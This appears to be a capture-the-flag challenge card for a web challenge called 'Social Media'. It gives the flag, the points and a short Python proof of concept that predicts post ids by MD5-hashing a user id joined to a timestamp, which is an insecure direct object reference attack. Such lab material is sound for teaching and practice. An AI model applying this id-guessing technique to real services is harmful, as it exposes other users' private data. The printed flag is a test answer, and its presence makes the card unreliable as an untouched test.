# Challenge Name:
Social Media

## Description:
Make sure that your app validates things before they get in.

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{id0rrrrr_88efdbccaeddea_flag_found}`

## Points:
500

## Author:
k.eii

## PoC
```
import hashlib
import time

timestamp = int(time.mktime(time.strptime('2025-01-15 16:05:38', '%Y-%m-%d %H:%M:%S')))
print(f"Timestamp: {timestamp}")
data = f"51{timestamp}"

hash_result = hashlib.md5(data.encode()).hexdigest()

print(f"post id: {hash_result}")
```